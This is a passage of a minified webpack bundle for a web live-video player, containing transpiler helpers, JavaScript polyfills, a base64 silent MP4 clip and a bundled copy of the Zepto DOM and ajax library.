(this.webpackJsonpLivePlayer=this.webpackJsonpLivePlayer||[]).push([[0],{1:function(e,t,r){(function(Qi){e.exports=function(){"use strict";function M(t,e){var r=Object.keys(t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(t);e&&(n=n.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),r.push.apply(r,n)}return r}function F(t){for(var e=1;e<arguments.length;e++){var r=null!=arguments[e]?arguments[e]:{};e%2?M(Object(r),!0).forEach((function(e){B(t,e,r[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(r)):M(Object(r)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(r,e))}))}return t}function B(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function U(e){return U="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},U(e)}function u(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}function j(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function c(e,t,r){return t&&j(e.prototype,t),r&&j(e,r),e}function V(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function G(t,e){var r=Object.keys(t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(t);e&&(n=n.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),r.push.apply(r,n)}return r}function K(t){for(var e=1;e<arguments.length;e++){var r=null!=arguments[e]?arguments[e]:{};e%2?G(Object(r),!0).forEach((function(e){V(t,e,r[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(r)):G(Object(r)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(r,e))}))}return t}function d(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&Y(e,t)}function s(e){return s=Object.setPrototypeOf?Object.getPrototypeOf:function e(t){return t.__proto__||Object.getPrototypeOf(t)},s(e)}function Y(e,t){return Y=Object.setPrototypeOf||function e(t,r){return t.__proto__=r,t},Y(e,t)}function z(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}function f(i){var a=function H(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Date.prototype.toString.call(Reflect.construct(Date,[],(function(){}))),!0}catch(e){return!1}}();return function e(){var r,t=s(i);if(a){var n=s(this).constructor;r=Reflect.construct(t,arguments,n)}else r=t.apply(this,arguments);return function $(e,t){return!t||"object"!=typeof t&&"function"!=typeof t?z(e):t}(this,r)}}function q(e,t,r){return q="undefined"!=typeof Reflect&&Reflect.get?Reflect.get:function e(t,r,n){var i=function W(e,t){for(;!Object.prototype.hasOwnProperty.call(e,t)&&null!==(e=s(e)););return e}(t,r);if(i){var a=Object.getOwnPropertyDescriptor(i,r);return a.get?a.get.call(n):a.value}},q(e,t,r||e)}function X(e,t){return function J(e){if(Array.isArray(e))return e}(e)||function te(e,t){if("undefined"==typeof Symbol||!(Symbol.iterator in Object(e)))return;var r=[],n=!0,i=!1,a=void 0;try{for(var o,s=e[Symbol.iterator]();!(n=(o=s.next()).done)&&(r.push(o.value),!t||r.length!==t);n=!0);}catch(e){i=!0,a=e}finally{try{n||null==s.return||s.return()}finally{if(i)throw a}}return r}(e,t)||re(e,t)||function ae(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function Z(e){return function Q(e){if(Array.isArray(e))return ne(e)}(e)||function ee(e){if("undefined"!=typeof Symbol&&Symbol.iterator in Object(e))return Array.from(e)}(e)||re(e)||function ie(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function re(e,t){if(e){if("string"==typeof e)return ne(e,t);var r=Object.prototype.toString.call(e).slice(8,-1);return"Object"===r&&e.constructor&&(r=e.constructor.name),"Map"===r||"Set"===r?Array.from(e):"Arguments"===r||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)?ne(e,t):void 0}}function ne(e,t){(null==t||t>e.length)&&(t=e.length);for(var r=0,n=new Array(t);r<t;r++)n[r]=e[r];return n}function se(e,t){var r;if("undefined"==typeof Symbol||null==e[Symbol.iterator]){if(Array.isArray(e)||(r=re(e))||t&&e&&"number"==typeof e.length){r&&(e=r);var n=0,i=function(){};return{s:i,n:function(){return n>=e.length?{done:!0}:{done:!1,value:e[n++]}},e:function(e){throw e},f:i}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var o,a=!0,s=!1;return{s:function(){r=e[Symbol.iterator]()},n:function(){var e=r.next();return a=e.done,e},e:function(e){s=!0,o=e},f:function(){try{a||null==r.return||r.return()}finally{if(s)throw o}}}}Array.prototype.find||Object.defineProperty(Array.prototype,"find",{value:function e(t){if(null==this)throw new TypeError('"this" is null or not defined');var r=Object(this),n=r.length>>>0;if("function"!=typeof t)throw new TypeError("predicate must be a function");for(var i=arguments[1],a=0;a<n;){var s=r[a];if(t.call(i,s,a,r))return s;a++}}}),Object.entries||(Object.entries=function(e){for(var t=Object.keys(e),r=t.length,n=new Array(r);r--;)n[r]=[t[r],e[t[r]]];return n}),Object.values||(Object.values=function(e){for(var t=Object.keys(e),r=t.length,n=new Array(r);r--;)n[r]=e[t[r]];return n}),"function"!=typeof Object.assign&&Object.defineProperty(Object,"assign",{value:function e(t,r){if(null==t)throw new TypeError("Cannot convert undefined or null to object");for(var n=Object(t),i=1;i<arguments.length;i++){var a=arguments[i];if(null!=a)for(var s in a)Object.prototype.hasOwnProperty.call(a,s)&&(n[s]=a[s])}return n},writable:!0,configurable:!0}),Array.prototype.findIndex||Object.defineProperty(Array.prototype,"findIndex",{value:function e(t){if(null==this)throw new TypeError('"this" is null or not defined');var r=Object(this),n=r.length>>>0;if("function"!=typeof t)throw new TypeError("predicate must be a function");for(var i=arguments[1],a=0;a<n;){var s=r[a];if(t.call(i,s,a,r))return a;a++}return-1},configurable:!0,writable:!0});var de,g,le={mp4:"data:video/mp4;base64,AAAAHGZ0eXBpc29tAAACAGlzb21pc28ybXA0MQAAAAhmcmVlAAAC721kYXQhEAUgpBv/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3pwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcCEQBSCkG//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADengAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAsJtb292AAAAbG12aGQAAAAAAAAAAAAAAAAAAAPoAAAALwABAAABAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAB7HRyYWsAAABcdGtoZAAAAAMAAAAAAAAAAAAAAAIAAAAAAAAALwAAAAAAAAAAAAAAAQEAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACRlZHRzAAAAHGVsc3QAAAAAAAAAAQAAAC8AAAAAAAEAAAAAAWRtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAAKxEAAAIAFXEAAAAAAAtaGRscgAAAAAAAAAAc291bgAAAAAAAAAAAAAAAFNvdW5kSGFuZGxlcgAAAAEPbWluZgAAABBzbWhkAAAAAAAAAAAAAAAkZGluZgAAABxkcmVmAAAAAAAAAAEAAAAMdXJsIAAAAAEAAADTc3RibAAAAGdzdHNkAAAAAAAAAAEAAABXbXA0YQAAAAAAAAABAAAAAAAAAAAAAgAQAAAAAKxEAAAAAAAzZXNkcwAAAAADgICAIgACAASAgIAUQBUAAAAAAfQAAAHz+QWAgIACEhAGgICAAQIAAAAYc3R0cwAAAAAAAAABAAAAAgAABAAAAAAcc3RzYwAAAAAAAAABAAAAAQAAAAIAAAABAAAAHHN0c3oAAAAAAAAAAAAAAAIAAAFzAAABdAAAABRzdGNvAAAAAAAAAAEAAAAsAAAAYnVkdGEAAABabWV0YQAAAAAAAAAhaGRscgAAAAAAAAAAbWRpcmFwcGwAAAAAAAAAAAAAAAAtaWxzdAAAACWpdG9vAAAAHWRhdGEAAAABAAAAAExhdmY1Ni40MC4xMDE="},e=function(){var l,s,u,i,A,m,n=[],M=n.concat,a=n.filter,o=n.slice,c=window.document,d={},t={},F={"column-count":1,columns:1,"font-weight":1,"line-height":1,opacity:1,"z-index":1,zoom:1},f=/^\s*<(\w+|!)[^>]*>/,B=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,U=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,h=/^(?:body|html)$/i,j=/([A-Z])/g,V=["val","css","html","text","data","width","height","offset"],e=c.createElement("table"),r=c.createElement("tr"),p={tr:c.createElement("tbody"),tbody:e,thead:e,tfoot:e,td:r,th:r,"*":c.createElement("div")},K=/complete|loaded|interactive/,Y=/^[\w-]*$/,v={},H=v.toString,g={},y=c.createElement("div"),E={tabindex:"tabIndex",readonly:"readOnly",for:"htmlFor",class:"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"},b=Array.isArray||function(e){return e instanceof Array};function k(e){return null==e?String(e):v[H.call(e)]||"object"}function _(e){return"function"==k(e)}function T(e){return null!=e&&e==e.window}function S(e){return null!=e&&e.nodeType==e.DOCUMENT_NODE}function C(e){return"object"==k(e)}function R(e){return C(e)&&!T(e)&&Object.getPrototypeOf(e)==Object.prototype}function w(e){var t=!!e&&"length"in e&&e.length,r=u.type(e);return"function"!=r&&!T(e)&&("array"==r||0===t||"number"==typeof t&&t>0&&t-1 in e)}function O(e){return e.replace(/::/g,"/").replace(/([A-Z]+)([A-Z][a-z])/g,"$1_$2").replace(/([a-z\d])([A-Z])/g,"$1_$2").replace(/_/g,"-").toLowerCase()}function L(e){return e in t?t[e]:t[e]=new RegExp("(^|\\s)"+e+"(\\s|$)")}function I(e,t){return"number"!=typeof t||F[O(e)]?t:t+"px"}function q(e){return"children"in e?o.call(e.children):u.map(e.childNodes,(function(e){if(1==e.nodeType)return e}))}function X(e,t){var r,n=e?e.length:0;for(r=0;r<n;r++)this[r]=e[r];this.length=n,this.selector=t||""}function Z(e,t,r){for(s in t)r&&(R(t[s])||b(t[s]))?(R(t[s])&&!R(e[s])&&(e[s]={}),b(t[s])&&!b(e[s])&&(e[s]=[]),Z(e[s],t[s],r)):t[s]!==l&&(e[s]=t[s])}function D(e,t){return null==t?u(e):u(e).filter(t)}function P(e,t,r,n){return _(t)?t.call(e,r,n):t}function N(e,t,r){null==r?e.removeAttribute(t):e.setAttribute(t,r)}function x(e,t){var r=e.className||"",n=r&&r.baseVal!==l;if(t===l)return n?r.baseVal:r;n?r.baseVal=t:e.className=t}function Q(t){try{return t?"true"==t||"false"!=t&&("null"==t?null:+t+""==t?+t:/^[\[\{]/.test(t)?u.parseJSON(t):t):t}catch(e){return t}}function J(e,t){t(e);for(var r=0,n=e.childNodes.length;r<n;r++)J(e.childNodes[r],t)}return g.matches=function(e,t){if(!t||!e||1!==e.nodeType)return!1;var r=e.matches||e.webkitMatchesSelector||e.mozMatchesSelector||e.oMatchesSelector||e.matchesSelector;if(r)return r.call(e,t);var n,i=e.parentNode,a=!i;return a&&(i=y).appendChild(e),n=~g.qsa(i,t).indexOf(e),a&&y.removeChild(e),n},A=function(e){return e.replace(/-+(.)?/g,(function(e,t){return t?t.toUpperCase():""}))},m=function(r){return a.call(r,(function(e,t){return r.indexOf(e)==t}))},g.fragment=function(e,t,r){var n,i,a;return B.test(e)&&(n=u(c.createElement(RegExp.$1))),n||(e.replace&&(e=e.replace(U,"<$1></$2>")),t===l&&(t=f.test(e)&&RegExp.$1),t in p||(t="*"),(a=p[t]).innerHTML=""+e,n=u.each(o.call(a.childNodes),(function(){a.removeChild(this)}))),R(r)&&(i=u(n),u.each(r,(function(e,t){V.indexOf(e)>-1?i[e](t):i.attr(e,t)}))),n},g.Z=function(e,t){return new X(e,t)},g.isZ=function(e){return e instanceof g.Z},g.init=function(e,t){var r;if(!e)return g.Z();if("string"==typeof e)if("<"==(e=e.trim())[0]&&f.test(e))r=g.fragment(e,RegExp.$1,t),e=null;else{if(t!==l)return u(t).find(e);r=g.qsa(c,e)}else{if(_(e))return u(c).ready(e);if(g.isZ(e))return e;if(b(e))r=function z(e){return a.call(e,(function(e){return null!=e}))}(e);else if(C(e))r=[e],e=null;else if(f.test(e))r=g.fragment(e.trim(),RegExp.$1,t),e=null;else{if(t!==l)return u(t).find(e);r=g.qsa(c,e)}}return g.Z(r,e)},u=function(e,t){return g.init(e,t)},u.extend=function(t){var r,e=o.call(arguments,1);return"boolean"==typeof t&&(r=t,t=e.shift()),e.forEach((function(e){Z(t,e,r)})),t},g.qsa=function(e,t){var r,n="#"==t[0],i=!n&&"."==t[0],a=n||i?t.slice(1):t,s=Y.test(a);return e.getElementById&&s&&n?(r=e.getElementById(a))?[r]:[]:1!==e.nodeType&&9!==e.nodeType&&11!==e.nodeType?[]:o.call(s&&!n&&e.getElementsByClassName?i?e.getElementsByClassName(a):e.getElementsByTagName(t):e.querySelectorAll(t))},u.contains=c.documentElement.contains?function(e,t){return e!==t&&e.contains(t)}:function(e,t){for(;t&&(t=t.parentNode);)if(t===e)return!0;return!1},u.type=k,u.isFunction=_,u.isWindow=T,u.isArray=b,u.isPlainObject=R,u.isEmptyObject=function(e){var t;for(t in e)return!1;return!0},u.isNumeric=function(e){var t=Number(e),r=typeof e;return null!=e&&"boolean"!=r&&("string"!=r||e.length)&&!isNaN(t)&&isFinite(t)||!1},u.inArray=function(e,t,r){return n.indexOf.call(t,e,r)},u.camelCase=A,u.trim=function(e){return null==e?"":String.prototype.trim.call(e)},u.uuid=0,u.support={},u.expr={},u.noop=function(){},u.map=function(e,t){var r,i,a,n=[];if(w(e))for(i=0;i<e.length;i++)null!=(r=t(e[i],i))&&n.push(r);else for(a in e)null!=(r=t(e[a],a))&&n.push(r);return function $(e){return e.length>0?u.fn.concat.apply([],e):e}(n)},u.each=function(e,t){var r,n;if(w(e)){for(r=0;r<e.length;r++)if(!1===t.call(e[r],r,e[r]))return e}else for(n in e)if(!1===t.call(e[n],n,e[n]))return e;return e},u.grep=function(e,t){return a.call(e,t)},window.JSON&&(u.parseJSON=JSON.parse),u.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),(function(e,t){v["[object "+t+"]"]=t.toLowerCase()})),u.fn={constructor:g.Z,length:0,forEach:n.forEach,reduce:n.reduce,push:n.push,sort:n.sort,splice:n.splice,indexOf:n.indexOf,concat:function(){var e,t,r=[];for(e=0;e<arguments.length;e++)t=arguments[e],r[e]=g.isZ(t)?t.toArray():t;return M.apply(g.isZ(this)?this.toArray():this,r)},map:function(r){return u(u.map(this,(function(e,t){return r.call(e,t,e)})))},slice:function(){return u(o.apply(this,arguments))},ready:function(e){return K.test(c.readyState)&&c.body?e(u):c.addEventListener("DOMContentLoaded",(function(){e(u)}),!1),this},get:function(e){return e===l?o.call(this):this[e>=0?e:e+this.length]},toArray:function(){return this.get()},size:function(){return this.length},remove:function(){return this.each((function(){null!=this.parentNode&&this.parentNode.removeChild(this)}))},each:function(r){return n.every.call(this,(function(e,t){return!1!==r.call(e,t,e)})),this},filter:function(t){return _(t)?this.not(this.not(t)):u(a.call(this,(function(e){return g.matches(e,t)})))},add:function(e,t){return u(m(this.concat(u(e,t))))},is:function(e){return this.length>0&&g.matches(this[0],e)},not:function(t){var r=[];if(_(t)&&t.call!==l)this.each((function(e){t.call(this,e)||r.push(this)}));else{var n="string"==typeof t?this.filter(t):w(t)&&_(t.item)?o.call(t):u(t);this.forEach((function(e){n.indexOf(e)<0&&r.push(e)}))}return u(r)},has:function(e){return this.filter((function(){return C(e)?u.contains(this,e):u(this).find(e).size()}))},eq:function(e){return-1===e?this.slice(e):this.slice(e,+e+1)},first:function(){var e=this[0];return e&&!C(e)?e:u(e)},last:function(){var e=this[this.length-1];return e&&!C(e)?e:u(e)},find:function(e){var r=this;return e?"object"==typeof e?u(e).filter((function(){var t=this;return n.some.call(r,(function(e){return u.contains(e,t)}))})):1==this.length?u(g.qsa(this[0],e)):this.map((function(){return g.qsa(this,e)})):u()},closest:function(r,n){var i=[],a="object"==typeof r&&u(r);return this.each((function(e,t){for(;t&&!(a?a.indexOf(t)>=0:g.matches(t,r));)t=t!==n&&!S(t)&&t.parentNode;t&&i.indexOf(t)<0&&i.push(t)})),u(i)},parents:function(e){for(var t=[],r=this;r.length>0;)r=u.map(r,(function(e){if((e=e.parentNode)&&!S(e)&&t.indexOf(e)<0)return t.push(e),e}));return D(t,e)},parent:function(e){return D(m(this.pluck("parentNode")),e)},children:function(e){return D(this.map((function(){return q(this)})),e)},contents:function(){return this.map((function(){return this.contentDocument||o.call(this.childNodes)}))},siblings:function(e){return D(this.map((function(e,t){return a.call(q(t.parentNode),(function(e){return e!==t}))})),e)},empty:function(){return this.each((function(){this.innerHTML=""}))},pluck:function(t){return u.map(this,(function(e){return e[t]}))},show:function(){return this.each((function(){"none"==this.style.display&&(this.style.display=""),"none"==getComputedStyle(this,"").getPropertyValue("display")&&(this.style.display=function W(e){var t,r;return d[e]||(t=c.createElement(e),c.body.appendChild(t),r=getComputedStyle(t,"").getPropertyValue("display"),t.parentNode.removeChild(t),"none"==r&&(r="block"),d[e]=r),d[e]}(this.nodeName))}))},replaceWith:function(e){return this.before(e).remove()},wrap:function(t){var r=_(t);if(this[0]&&!r)var n=u(t).get(0),i=n.parentNode||this.length>1;return this.each((function(e){u(this).wrapAll(r?t.call(this,e):i?n.cloneNode(!0):n)}))},wrapAll:function(e){if(this[0]){var t;for(u(this[0]).before(e=u(e));(t=e.children()).length;)e=t.first();u(e).append(this)}return this},wrapInner:function(i){var a=_(i);return this.each((function(e){var t=u(this),r=t.contents(),n=a?i.call(this,e):i;r.length?r.wrapAll(n):t.append(n)}))},unwrap:function(){return this.parent().each((function(){u(this).replaceWith(u(this).children())})),this},clone:function(){return this.map((function(){return this.cloneNode(!0)}))},hide:function(){return this.css("display","none")},toggle:function(t){return this.each((function(){var e=u(this);(t===l?"none"==e.css("display"):t)?e.show():e.hide()}))},prev:function(e){return u(this.pluck("previousElementSibling")).filter(e||"*")},next:function(e){return u(this.pluck("nextElementSibling")).filter(e||"*")},html:function(r){return 0 in arguments?this.each((function(e){var t=this.innerHTML;u(this).empty().append(P(this,r,e,t))})):0 in this?this[0].innerHTML:null},text:function(r){return 0 in arguments?this.each((function(e){var t=P(this,r,e,this.textContent);this.textContent=null==t?"":""+t})):0 in this?this.pluck("textContent").join(""):null},attr:function(t,r){var e;return"string"!=typeof t||1 in arguments?this.each((function(e){if(1===this.nodeType)if(C(t))for(s in t)N(this,s,t[s]);else N(this,t,P(this,r,e,this.getAttribute(t)))})):0 in this&&1==this[0].nodeType&&null!=(e=this[0].getAttribute(t))?e:l},removeAttr:function(e){return this.each((function(){1===this.nodeType&&e.split(" ").forEach((function(e){N(this,e)}),this)}))},prop:function(t,r){return t=E[t]||t,1 in arguments?this.each((function(e){this[t]=P(this,r,e,this[t])})):this[0]&&this[0][t]},removeProp:function(e){return e=E[e]||e,this.each((function(){delete this[e]}))},data:function(e,t){var r="data-"+e.replace(j,"-$1").toLowerCase(),n=1 in arguments?this.attr(r,t):this.attr(r);return null!==n?Q(n):l},val:function(t){return 0 in arguments?(null==t&&(t=""),this.each((function(e){this.value=P(this,t,e,this.value)}))):this[0]&&(this[0].multiple?u(this[0]).find("option").filter((function(){return this.selected})).pluck("value"):this[0].value)},offset:function(a){if(a)return this.each((function(e){var t=u(this),r=P(this,a,e,t.offset()),n=t.offsetParent().offset(),i={top:r.top-n.top,left:r.left-n.left};"static"==t.css("position")&&(i.position="relative"),t.css(i)}));if(!this.length)return null;if(c.documentElement!==this[0]&&!u.contains(c.documentElement,this[0]))return{top:0,left:0};var e=this[0].getBoundingClientRect();return{left:e.left+window.pageXOffset,top:e.top+window.pageYOffset,width:Math.round(e.width),height:Math.round(e.height)}},css:function(e,t){if(arguments.length<2){var r=this[0];if("string"==typeof e){if(!r)return;return r.style[A(e)]||getComputedStyle(r,"").getPropertyValue(e)}if(b(e)){if(!r)return;var n={},i=getComputedStyle(r,"");return u.each(e,(function(e,t){n[t]=r.style[A(t)]||i.getPropertyValue(t)})),n}}var a="";if("string"==k(e))t||0===t?a=O(e)+":"+I(e,t):this.each((function(){this.style.removeProperty(O(e))}));else for(s in e)e[s]||0===e[s]?a+=O(s)+":"+I(s,e[s])+";":this.each((function(){this.style.removeProperty(O(s))}));return this.each((function(){this.style.cssText+=";"+a}))},index:function(e){return e?this.indexOf(u(e)[0]):this.parent().children().indexOf(this[0])},hasClass:function(e){return!!e&&n.some.call(this,(function(e){return this.test(x(e))}),L(e))},addClass:function(n){return n?this.each((function(e){if("className"in this){i=[];var t=x(this);P(this,n,e,t).split(/\s+/g).forEach((function(e){u(this).hasClass(e)||i.push(e)}),this),i.length&&x(this,t+(t?" ":"")+i.join(" "))}})):this},removeClass:function(t){return this.each((function(e){if("className"in this){if(t===l)return x(this,"");i=x(this),P(this,t,e,i).split(/\s+/g).forEach((function(e){i=i.replace(L(e)," ")})),x(this,i.trim())}}))},toggleClass:function(n,i){return n?this.each((function(e){var t=u(this);P(this,n,e,x(this)).split(/\s+/g).forEach((function(e){(i===l?!t.hasClass(e):i)?t.addClass(e):t.removeClass(e)}))})):this},scrollTop:function(e){if(this.length){var t="scrollTop"in this[0];return e===l?t?this[0].scrollTop:this[0].pageYOffset:this.each(t?function(){this.scrollTop=e}:function(){this.scrollTo(this.scrollX,e)})}},scrollLeft:function(e){if(this.length){var t="scrollLeft"in this[0];return e===l?t?this[0].scrollLeft:this[0].pageXOffset:this.each(t?function(){this.scrollLeft=e}:function(){this.scrollTo(e,this.scrollY)})}},position:function(){if(this.length){var e=this[0],t=this.offsetParent(),r=this.offset(),n=h.test(t[0].nodeName)?{top:0,left:0}:t.offset();return r.top-=parseFloat(u(e).css("margin-top"))||0,r.left-=parseFloat(u(e).css("margin-left"))||0,n.top+=parseFloat(u(t[0]).css("border-top-width"))||0,n.left+=parseFloat(u(t[0]).css("border-left-width"))||0,{top:r.top-n.top,left:r.left-n.left}}},offsetParent:function(){return this.map((function(){for(var e=this.offsetParent||c.body;e&&!h.test(e.nodeName)&&"static"==u(e).css("position");)e=e.offsetParent;return e}))}},u.fn.detach=u.fn.remove,["width","height"].forEach((function(n){var i=n.replace(/./,(function(e){return e[0].toUpperCase()}));u.fn[n]=function(t){var e,r=this[0];return t===l?T(r)?r["inner"+i]:S(r)?r.documentElement["scroll"+i]:(e=this.offset())&&e[n]:this.each((function(e){(r=u(this)).css(n,P(this,t,e,r[n]()))}))}})),["after","prepend","before","append"].forEach((function(t,s){var o=s%2;u.fn[t]=function(){var r,i,n=u.map(arguments,(function(e){var t=[];return"array"==(r=k(e))?(e.forEach((function(e){return e.nodeType!==l?t.push(e):u.zepto.isZ(e)?t=t.concat(e.get()):void(t=t.concat(g.fragment(e)))})),t):"object"==r||null==e?e:g.fragment(e)})),a=this.length>1;return n.length<1?this:this.each((function(e,t){i=o?t:t.parentNode,t=0==s?t.nextSibling:1==s?t.firstChild:2==s?t:null;var r=u.contains(c.documentElement,i);n.forEach((function(e){if(a)e=e.cloneNode(!0);else if(!i)return u(e).remove();i.insertBefore(e,t),r&&J(e,(function(e){if(!(null==e.nodeName||"SCRIPT"!==e.nodeName.toUpperCase()||e.type&&"text/javascript"!==e.type||e.src)){var t=e.ownerDocument?e.ownerDocument.defaultView:window;t.eval.call(t,e.innerHTML)}}))}))}))},u.fn[o?t+"To":"insert"+(s?"Before":"After")]=function(e){return u(e)[t](this),this}})),g.Z.prototype=X.prototype=u.fn,g.uniq=m,g.deserializeValue=Q,u.zepto=g,u}(),v=(window.Zepto=e,void 0===window.$&&(window.$=e),e),ue=+new Date,ce=window.document,fe=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,he=/^(?:text|application)\/javascript/i,pe=/^(?:text|application)\/xml/i,ve="application/json",ge="text/html",Ae=/^\s*$/,me=ce.createElement("a");function Ee(e,t,r,n){if(e.global)return function ye(e,t,r){var n=v.Event(t);return v(e).trigger(n,r),!n.isDefaultPrevented()}(t||ce,r,n)}function _e(e,t){var r=t.context;if(!1===t.beforeSend.call(r,e,t)||!1===Ee(t,r,"ajaxBeforeSend",[e,t]))return!1;Ee(t,r,"ajaxSend",[e,t])}function Te(e,t,r,n){var i=r.context,a="success";r.success.call(i,e,a,t),n&&n.resolveWith(i,[e,a,t]),Ee(r,i,"ajaxSuccess",[t,r,e]),Ce(a,t,r)}function Se(e,t,r,n,i){var a=n.context;n.error.call(a,r,t,e),i&&i.rejectWith(a,[r,t,e]),Ee(n,a,"ajaxError",[r,n,e||t]),Ce(t,r,n)}function Ce(e,t,r){var n=r.context;r.complete.call(n,t,e),Ee(r,n,"ajaxComplete",[t,r]),function ke(e){e.global&&! --v.active&&Ee(e,null,"ajaxStop")}(r)}function A(){}function Oe(e,t){return""==t?e:(e+"&"+t).replace(/[&?]{1,2}/,"?")}function Ie(e,t,r,n){return v.isFunction(t)&&(n=r,r=t,t=void 0),v.isFunction(r)||(n=r,r=void 0),{url:e,data:t,success:r,dataType:n}}me.href=window.location.href,v.active=0,v.ajaxJSONP=function(r,n){if(!("type"in r))return v.ajax(r);var o,u,e=r.jsonpCallback,i=(v.isFunction(e)?e():e)||"Zepto"+ue++,a=ce.createElement("script"),s=window[i],t=function(e){v(a).triggerHandler("error",e||"abort")},l={abort:t};return n&&n.promise(l),v(a).on("load error",(function(e,t){clearTimeout(u),v(a).off().remove(),"error"!=e.type&&o?Te(o[0],l,r,n):Se(null,t||"error",l,r,n),window[i]=s,o&&v.isFunction(s)&&s(o[0]),s=o=void 0})),!1===_e(l,r)?(t("abort"),l):(window[i]=function(){o=arguments},a.src=r.url.replace(/\?(.+)=\?/,"?$1="+i),ce.head.appendChild(a),r.timeout>0&&(u=setTimeout((function(){t("timeout")}),r.timeout)),l)},v.ajaxSettings={type:"GET",beforeSend:A,success:A,error:A,complete:A,context:null,global:!0,xhr:function(){return new window.XMLHttpRequest},accepts:{script:"text/javascript, application/javascript, application/x-javascript",json:ve,xml:"application/xml, text/xml",html:ge,text:"text/plain"},crossDomain:!1,timeout:0,processData:!0,cache:!0,dataFilter:A},v.ajax=function(e){var t,i,r=v.extend({},e||{}),n=v.Deferred&&v.Deferred();for(de in v.ajaxSettings)void 0===r[de]&&(r[de]=v.ajaxSettings[de]);!function be(e){e.global&&0==v.active++&&Ee(e,null,"ajaxStart")}(r),r.crossDomain||((t=ce.createElement("a")).href=r.url,t.href=t.href,r.crossDomain=me.protocol+"//"+me.host!=t.protocol+"//"+t.host),r.url||(r.url=window.location.toString()),(i=r.url.indexOf("#"))>-1&&(r.url=r.url.slice(0,i)),function Le(e){e.processData&&e.data&&"string"!=v.type(e.data)&&(e.data=v.param(e.data,e.traditional)),!e.data||e.type&&"GET"!=e.type.toUpperCase()&&"jsonp"!=e.dataType||(e.url=Oe(e.url,e.data),e.data=void 0)}(r);var 